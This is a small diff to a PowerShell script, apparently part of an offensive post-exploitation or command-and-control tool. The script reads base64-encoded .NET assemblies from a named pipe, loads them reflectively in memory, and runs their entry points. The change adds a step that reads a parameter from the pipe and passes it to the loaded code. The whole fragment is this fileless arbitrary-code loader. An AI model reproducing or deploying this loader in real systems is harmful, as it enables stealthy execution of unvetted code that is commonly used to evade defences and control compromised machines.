@@ -63,7 +63,12 @@ while($pipeClient.IsConnected){
         $msg = $sr.ReadLine()
         $assemblyByte = [System.Convert]::FromBase64String($msg)
         $assembly = [System.Reflection.Assembly]::Load($assemblyByte)
-        $assembly.EntryPoint.Invoke($null, $null)
+        Write-Host "Waiting for parameter..."
+        [String]$msg = $sr.ReadLine()
+        Write-Host "Parameter received : ", $msg
+        [String[]]$parameter = @(, $msg)
+        $parameter_invoke = (, $parameter)
+        $assembly.EntryPoint.Invoke($null, $parameter_invoke)
         $status = "0"
     }
 
